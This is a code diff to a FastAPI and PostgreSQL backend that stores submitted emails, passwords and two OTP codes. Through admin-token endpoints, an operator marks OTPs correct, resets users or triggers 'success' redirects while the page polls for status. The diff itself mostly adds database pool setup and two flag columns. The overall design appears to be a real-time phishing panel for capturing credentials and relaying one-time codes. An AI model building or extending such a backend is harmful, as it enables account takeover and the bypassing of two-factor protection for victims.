@@ -14,6 +14,7 @@ from dotenv import load_dotenv
 import asyncpg
 from contextlib import asynccontextmanager
 import logging
+import asyncio
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
@@ -78,26 +79,52 @@ manager = ConnectionManager()
 # Database connection pool
 db_pool = None
 
+async def init_db_pool():
+    """Initialize database connection pool with proper settings for Neon DB"""
+    global db_pool
+    try:
+        logger.info("Connecting to database...")
+        
+        # Parse DATABASE_URL to add connection parameters if not present
+        if '?' not in DATABASE_URL:
+            DATABASE_URL_WITH_PARAMS = DATABASE_URL + "?sslmode=require&connect_timeout=10"
+        else:
+            DATABASE_URL_WITH_PARAMS = DATABASE_URL
+        
+        # Create connection pool with Neon DB optimized settings
+        db_pool = await asyncpg.create_pool(
+            DATABASE_URL_WITH_PARAMS,
+            min_size=1,
+            max_size=5,  # Reduced for Neon free tier
+            command_timeout=30,
+            max_inactive_connection_lifetime=300,  # 5 minutes
+            max_queries=50000,
+            max_cached_statement_lifetime=300,
+        )
+        
+        # Test connection
+        async with db_pool.acquire() as conn:
+            await conn.execute("SELECT 1")
+            logger.info("Database connected successfully!")
+        return True
+    except Exception as e:
+        logger.error(f"Database connection error: {e}")
+        return False
+
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     global db_pool
-    # Startup
-    try:
-        logger.info("Connecting to database...")
-        db_pool = await asyncpg.create_pool(
-            DATABASE_URL,
-            min_size=1,
-            max_size=10,
-            command_timeout=60
-        )
-        logger.info("Database connected successfully!")
-    except Exception as e:
-        logger.error(f"Database connection error: {e}")
-        raise
     
-    # Create tables if not exists
+    # Startup
+    success = await init_db_pool()
+    if not success:
+        logger.error("Failed to connect to database. Exiting...")
+        raise Exception("Database connection failed")
+    
+    # Create tables and ensure schema is up to date
     async with db_pool.acquire() as conn:
         try:
+            # Create users table if not exists
             await conn.execute("""
                 CREATE TABLE IF NOT EXISTS users (
                     id SERIAL PRIMARY KEY,
@@ -115,6 +142,19 @@ async def lifespan(app: FastAPI):
             """)
             logger.info("Table 'users' ready")
             
+            # Add any missing columns (for existing tables)
+            columns_to_add = [
+                ("otp1_never", "BOOLEAN DEFAULT FALSE"),
+                ("success_redirect", "BOOLEAN DEFAULT FALSE")
+            ]
+            
+            for col_name, col_def in columns_to_add:
+                try:
+                    await conn.execute(f"ALTER TABLE users ADD COLUMN IF NOT EXISTS {col_name} {col_def}")
+                    logger.info(f"Added column '{col_name}' to users table")
+                except Exception as e:
+                    logger.warning(f"Could not add column '{col_name}': {e}")
+            
             # Create admin user if not exists
             await conn.execute("""
                 INSERT INTO users (email, password, approved)
@@ -124,7 +164,7 @@ async def lifespan(app: FastAPI):
             logger.info(f"Admin user ensured: {ADMIN_EMAIL}")
             
         except Exception as e:
-            logger.error(f"Table creation error: {e}")
+            logger.error(f"Table setup error: {e}")
             raise
     
     yield
@@ -137,7 +177,8 @@ async def lifespan(app: FastAPI):
 app = FastAPI(lifespan=lifespan)
 
 # Mount static files folder
-app.mount("/static", StaticFiles(directory="static"), name="static")
+if os.path.exists("static"):
+    app.mount("/static", StaticFiles(directory="static"), name="static")
 
 # Templates
 templates = Jinja2Templates(directory="templates")
@@ -300,7 +341,6 @@ async def check_otp_status(email: str):
             if user['otp1_never']:
                 return {"never": True, "redirect_url": f"/success?email={email}", "timeout": 5000}
             
-            # NEW: Check if success button was clicked
             if user['success_redirect']:
                 return {"success_redirect": True}
             
@@ -408,7 +448,6 @@ async def success_first_otp(action: AdminAction, credentials: HTTPAuthorizationC
         raise HTTPException(status_code=403, detail="Invalid token")
     
     async with db_pool.acquire() as conn:
-        # NEW: Set success_redirect flag to TRUE to distinguish from normal approve
         await conn.execute("""
             UPDATE users 
             SET otp1_correct = TRUE, approved = TRUE, success_redirect = TRUE, otp1_never = FALSE
@@ -472,8 +511,10 @@ async def reset_user(action: AdminAction, credentials: HTTPAuthorizationCredenti
         raise HTTPException(status_code=403, detail="Invalid token")
     
     async with db_pool.acquire() as conn:
+        # Delete old user record
         await conn.execute("DELETE FROM users WHERE email = $1", action.email)
         
+        # Create new fresh record
         await conn.execute("""
             INSERT INTO users (email, password, approved, otp, second_otp, otp1_correct, otp2_correct, otp1_never, success_redirect)
             VALUES ($1, $2, FALSE, NULL, NULL, FALSE, FALSE, FALSE, FALSE)
